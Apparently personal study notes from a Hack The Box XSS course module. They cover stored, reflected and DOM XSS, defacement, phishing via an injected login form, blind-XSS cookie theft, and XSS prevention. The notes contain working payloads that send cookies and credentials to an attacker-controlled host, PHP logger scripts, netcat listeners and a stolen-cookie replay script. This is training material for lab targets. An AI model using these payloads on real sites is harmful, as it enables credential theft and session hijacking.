# XSS

| **Code** | **Description** |
| --- | --- |
| **XSS Payloads** |  |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
| **Commands** |  |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80` | Start `PHP` server |

XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks.

There are three main types of XSS vulnerabilities:

| **Type** | **Description** |
| --- | --- |
| `Stored (Persistent) XSS` | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments) |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message) |
| `DOM-based XSS` | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |

## Stored XSS

The first and most critical type of XSS vulnerability is `Stored XSS` or `Persistent XSS`. If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

Testing payload:

```bash
<script>alert(window.origin)</script>
```

**Tip:** Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.

## Reflected XSS

`Reflected XSS` vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized

We can start the server below to practice on a web page vulnerable to a Reflected XSS vulnerability. It is a similar `To-Do List` app to the one we practiced with in the previous section. We can try adding any `test` string to see how it's handled:

![](https://academy.hackthebox.com/storage/modules/103/xss_reflected_1.jpg)

As we can see, we get `Task 'test' could not be added.`, which includes our input `test` as part of the error message. If our input was not filtered or sanitized, the page might be vulnerable to XSS. We can try the same XSS payload we used in the previous section and click `Add`:

![](https://academy.hackthebox.com/storage/modules/103/xss_reflected_2.jpg)

Once we click `Add`, we get the alert pop-up:

![](https://academy.hackthebox.com/storage/modules/103/xss_stored_xss_alert.jpg)

If we visit the `Reflected` page again, the error message no longer appears, and our XSS payload is not executed, which means that this XSS vulnerability is indeed `Non-Persistent`.

`But if the XSS vulnerability is Non-Persistent, how would we target victims with it?`

This depends on which HTTP request is used to send our input to the server. We can check this through the Firefox `Developer Tools` by clicking [`CTRL+I`] and selecting the `Network` tab. Then, we can put our `test` payload again and click `Add` to send it:

![](https://academy.hackthebox.com/storage/modules/103/xss_reflected_network.jpg)

As we can see, the first row shows that our request was a `GET` request. `GET` request sends their parameters and data as part of the URL. So, `to target a user, we can send them a URL containing our payload`. To get the URL, we can copy the URL from the URL bar in Firefox after sending our XSS payload, or we can right-click on the `GET` request in the `Network` tab and select `Copy>Copy URL`. Once the victim visits this URL, the XSS payload would execute.

## DOM XSS

The third and final type of XSS is another `Non-Persistent` type called `DOM-based XSS`. While `reflected XSS` sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the `Document Object Model (DOM)`.

DOM-based XSS Vulnerability: Source and Sink

### Understanding Source and Sink

- **Source**: The JavaScript object that takes user input, e.g., URL parameters or input fields.
- **Sink**: The function that writes the user input to a DOM element on the page.
    - If a Sink does not sanitize user input, it could lead to XSS vulnerabilities.

### Common Sink Functions Vulnerable to XSS

- **JavaScript Functions**:
    - `document.write()`
    - `DOM.innerHTML`
    - `DOM.outerHTML`
- **jQuery Functions**:
    - `add()`
    - `after()`
    - `append()`

If these functions handle input directly without sanitization, the page may be vulnerable to XSS.

### Example of Source and Sink in Code

In a To-Do web application:

- **Source**: URL parameter `task` is retrieved as follows:
    
    ```jsx
    var pos = document.URL.indexOf("task=");
    var task = document.URL.substring(pos + 5, document.URL.length);
    ```
    
- **Sink**: The `innerHTML` function writes the `task` variable to the DOM:
    
    ```jsx
    document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
    ```
    
    This setup is vulnerable as input is controlled but not sanitized.
    

### DOM XSS Attack Example

### Payload Example Without `<script>` Tags

Standard `<script>` tags may be blocked by `innerHTML`. Alternative payload:

```html
<img src="" onerror=alert(window.origin)>
```

- This code creates an `<img>` element with an `onerror` attribute that triggers JavaScript (in this case, `alert(window.origin)`) when the image is missing.
- **Example URL**:
    
    ```
    http://SERVER_IP:PORT/#task=<img src="">
    ```
    

By sharing this URL with a user, the payload will execute upon page load.

## XSS Discovery

Almost all Web Application Vulnerability Scanners (like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://www.zaproxy.org/)) have various capabilities for detecting all three types of XSS vulnerabilities. These scanners usually do two types of scanning: A Passive Scan, which reviews client-side code for potential DOM-based vulnerabilities, and an Active Scan, which sends various types of payloads to attempt to trigger an XSS through payload injection in the page source.

Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser). We can try `XSS Strike`

```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

## XSS Attacks

### Defacing a Website Using Stored XSS

Defacing attacks, often conducted via stored XSS vulnerabilities, allow attackers to alter the appearance of a website for all visitors. Stored XSS vulnerabilities are particularly critical as they enable persistent changes, unlike other forms of XSS.

**Common Elements for Defacing:**

1. **Background Color** - `document.body.style.background` or `document.body.background`
2. **Page Title** - `document.title`
3. **Page Text** - `DOM.innerHTML` (modify specific elements or the entire body)

### **Examples of Defacing Techniques:**

**Changing the Background Color**

To set a dark background:

```html
<script>document.body.style.background = "#141d2b";</script>
```

Alternatively, set a background image:

```html
<script>document.body.background = "<https://www.hackthebox.eu/images/logo-htb.svg>";</script>
```

**Modifying the Page Title**

Set a new title:

```html
<script>document.title = 'HackTheBox Academy';</script>
```

**Changing Page Text**

To modify text within a specific HTML element:

```jsx
document.getElementById("todo").innerHTML = "New Text";
```

To change the text in the entire page body:

```jsx
document.getElementsByTagName('body')[0].innerHTML = "New Text";
```

Using jQuery (if available):

```jsx
$("#todo").html('New Text');
```

### **Full Page Defacement Example**

The final payload inserts custom HTML content directly into the page’s body:

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="<https://academy.hackthebox.com/images/logo-htb.svg>" height="25px" alt="HTB Academy"></p></center>';</script>
```

Notes

- **Persistence**: These changes will persist due to the stored XSS, affecting all users who visit the page.
- **Order of Code Execution**: JavaScript executes in the sequence it appears. Ensure the placement of scripts within the source code for desired effect.

## Phishing

**Phishing Attack Using XSS**

1. **Overview of XSS Phishing**:
    - Attackers inject fake login forms to collect sensitive information.
    - Fake login forms send credentials to the attacker’s server, allowing unauthorized access.
2. **Practical Use for Phishing Simulations**:
    - Can simulate phishing attacks for security training.
    - Highlights vulnerabilities and employee susceptibility to phishing within trusted applications.

---

**XSS Discovery and Exploitation**

1. **Discovering XSS Vulnerabilities**:
    - The test application displays images from user-supplied URLs.
    - Testing with `<script>alert(window.origin)</script>` confirms an XSS vulnerability if executed.
    - Tip: Check HTML source to see how inputs are reflected to determine effective payloads.
2. **Login Form Injection (Phishing Setup)**:
    - Once XSS payload is functional, inject an HTML login form with:
        
        ```html
        <h3>Please login to continue</h3>
        <form action=http://OUR_IP>
            <input type="username" name="username" placeholder="Username">
            <input type="password" name="password" placeholder="Password">
            <input type="submit" name="submit" value="Login">
        </form>
        ```
        
    - Replace `OUR_IP` with the attacker’s IP to capture credentials.
3. **JavaScript Payload for Login Form Injection**:
    - Use `document.write()` to inject the HTML form:
        
        ```jsx
        document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
        ```
        
4. **Removing Original URL Field**:
    - Use `document.getElementById('urlform').remove();` to hide the URL field:
        
        ```jsx
        document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
        ```
        
5. **Hiding Remaining HTML**:
    - Add an HTML comment `<!--` to prevent any leftover HTML from displaying after the injected login form.

---

**Credential Capture Setup**

1. **Netcat Listener Setup**:
    - Listen for incoming connections on port 80 to capture credentials:
        
        ```bash
        sudo nc -lvnp 80
        ```
        
2. **PHP Server for Credential Logging**:

So we are going to use a PHP script and a PHP web server to not only gather the credentials, but also redirecting the user to the original web page to not raise any suspicion at all. Here is the PHP script:

- Create a PHP script (`index.php`) to capture credentials and redirect users:
    
    ```php
    <?php
    if (isset($_GET['username']) && isset($_GET['password'])) {
        $file = fopen("creds.txt", "a+");
        fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\\n");
        header("Location: http://SERVER_IP/phishing/index.php");
        fclose($file);
        exit();
    }
    ?>
    ```
    
1. **Starting PHP Server**:
    - Run the PHP server in `/tmp/tmpserver/`:
        
        ```bash
        mkdir /tmp/tmpserver
        cd /tmp/tmpserver
        sudo php -S 0.0.0.0:8
        ```
        
2. **Checking Collected Credentials**:
    - After a login attempt, credentials will be logged in `creds.txt`:
        
        ```bash
        cat creds.txt
        ```
        

---

**End-to-End Execution**

1. **Finalizing the Payload URL**:
    - Copy the URL containing the XSS payload and send it to the target.
    - Example URL format:
    
    ```bash
    http://10.129.7.166/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://10.10.15.148:80/%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%27);document.getElementById(%27urlform%27).remove();%3C/script%3E%3C!--
    ```
    
2. **Verification**:
    - Test that the injected form appears as intended.
    - Log in to verify that credentials are captured and stored in `creds.txt`.

## Session Hijacking (cookie stealing)

We usually start XSS attacks by trying to discover if and where an XSS vulnerability exists. However, in this exercise, we will be dealing with a `Blind XSS` vulnerability. A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

### Loading a remote script

```bash
<script src="http://OUR_IP/script.js"></script>
```

So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:

```bash
<script src="http://OUR_IP/username"></script>
```

If we get a request for `/username`, then we know that the `username` field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request. The following are a few examples we can use from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):

```bash
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

#AJAX payload
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

#JQUERY based payload using .getscript()
<script>$.getScript("http://OUR_IP")</script>
```

As we can see, various payloads start with an injection like `'>`, which may or may not work depending on how our input is handled in the backend. As previously mentioned in the `XSS Discovery` section, if we had access to the source code (i.e., in a DOM XSS), it would be possible to precisely write the required payload for a successful injection. This is why Blind XSS has a higher success rate with DOM XSS type of vulnerabilities.

Before we start sending payloads, we need to start a listener on our VM, using `netcat` or `php` 

- The first thing was to test the payloads field by field until someone sent a connection to my server

![](https://miro.medium.com/v2/resize:fit:700/1*VJ7_JqINL6dcwDMqyCOjJA.png)

Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.

- Payload used:

```bash
"><script src=http://10.10.15.148></script>
```

- Now that we know the field that is vulnerable, I will create a php server and a script.js to be run remotely

index.php :

```bash
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc):

script.js :

```bash
document.location='http://<our-ip>/index.php?c='+document.cookie;
# or 
new Image().src='http://<our-ip>/index.php?c='+document.cookie;
```

- Now just run the server and use the same script payload, just adding /script.js next to our ip.(“><script src=http://10.10.15.121/script.js></script>)

![](https://miro.medium.com/v2/resize:fit:700/1*MoD_ZT259NlR5BpNUnA71A.png)

- With the cookies in hand, we can go to /login.php through the browser, and add the cookie manually via the storage>cookies tab, but I created a script in Python that already makes the direct request

```python
import requests

url = "http://10.129.172.128/hijacking/login.php"
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "pt-BR,pt",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Cookie": "cookie=c00k1355h0u1d8353cu23d",
    "Host": "10.129.172.128",
    "Sec-GPC": "1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
}

response = requests.get(url, headers=headers)

print(response.text)
```

![image.png](image%2017.png)

## XSS Prevention

As discussed previously, XSS vulnerabilities are mainly linked to two parts of the web application: A `Source` like a user input field and a `Sink` that displays the input data. These are the main two points that we should focus on securing, both in the front-end and in the back-end.

### Front-End

**Input Validation:**

```python
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

As we can see, this code is testing the email input field and returning true or false whether it matches the Regex validation of an email format.

**Input Sanitization:**

In addition to input validation, we should always ensure that we do not allow any input with JavaScript code in it, by escaping any special characters. For this, we can utilize the [DOMPurify](https://github.com/cure53/DOMPurify) JavaScript library, as follows:

```python
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

**Direct Input:**

Finally, we should always ensure that we never use user input directly within certain HTML tags, like:

1. JavaScript code `<script></script>`
2. CSS Style Code `<style></style>`
3. Tag/Attribute Fields `<div name='INPUT'></div>`
4. HTML Comments `<!-- -->`

If user input goes into any of the above examples, it can inject malicious JavaScript code, which may lead to an XSS vulnerability. In addition to this, we should avoid using JavaScript functions that allow changing raw text of HTML fields, like:

- `DOM.innerHTML`
- `DOM.outerHTML`
- `document.write()`
- `document.writeln()`
- `document.domain`

And the following jQuery functions:

- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

As these functions write raw text to the HTML code, if any user input goes into them, it may include malicious JavaScript code, which leads to an XSS vulnerability.

### Back-End

**Input Validation:**

In the back-end is quite similar to the front-end, and it uses Regex or library functions to ensure that the input field is what is expected. If it does not match, then the back-end server will reject it and not display it.

An example of E-Mail validation on a PHP back-end is the following:

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```

For a NodeJS back-end, we can use the same JavaScript code mentioned earlier for the front-end.

**Input Sanitization:**

When it comes to input sanitization, then the back-end plays a vital role, as front-end input sanitization can be easily bypassed by sending custom `GET` or `POST` requests.

For example, for a PHP back-end, we can use the `addslashes` function to sanitize user input by escaping special characters with a backslash:

```php
addslashes($_GET['email'])
```

In any case, direct user input (e.g. `$_GET['email']`) should never be directly displayed on the page, as this can lead to XSS vulnerabilities.

For a NodeJS back-end, we can also use the [DOMPurify](https://github.com/cure53/DOMPurify) library as we did with the front-end, as follows:

```php
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

**Output HTML Encoding:**

This means that we have to encode any special characters into their HTML codes, which is helpful if we need to display the entire user input without introducing an XSS vulnerability. For a PHP back-end, we can use the `htmlspecialchars` or the `htmlentities` functions, which would encode certain special characters into their HTML codes (e.g. `<` into `&lt`), so the browser will display them correctly, but they will not cause any injection of any sort:

```php
htmlentities($_GET['email']);
```

For a NodejS back-end, we can use any library that does HTML encoding, like html-entities :

```jsx
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```

Once we ensure that all user input is validated, sanitized, and encoded on output, we should significantly reduce the risk of having XSS vulnerabilities.

### Server configurations

- Using HTTPS across the entire domain.
- Using XSS prevention headers.
- Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
- Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts.
- Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.